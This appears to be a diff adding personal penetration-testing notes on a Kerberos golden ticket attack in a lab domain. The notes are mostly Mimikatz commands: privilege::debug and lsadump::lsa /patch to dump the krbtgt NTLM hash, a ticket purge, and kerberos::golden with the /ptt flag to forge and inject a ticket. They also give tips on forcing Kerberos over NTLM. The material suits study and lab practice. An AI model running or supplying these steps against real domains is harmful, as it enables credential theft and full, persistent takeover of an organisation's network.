@@ -1,0 +1,22 @@
+Creating the golden ticket
+injecting it into memory
+
+Tips:
+does not require any administrative privileges
+computer outside the domain.
+Use hostname, using IP will use NTLM
+
+.\mimikatz.exe
+privilege::debug
+
+# Dump krbtgt NTLM hash:
+lsadump::lsa /patch
+
+# Clear the tickets:
+kerberos::purge
+
+# Create the golden ticket
+# Specify domain user
+# Domain SID
+# NTLM hash for krbtgt
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-6xxx05-1781884369 /krbtgt:1693c6cefaxxxf34d1c788f47 /ptt
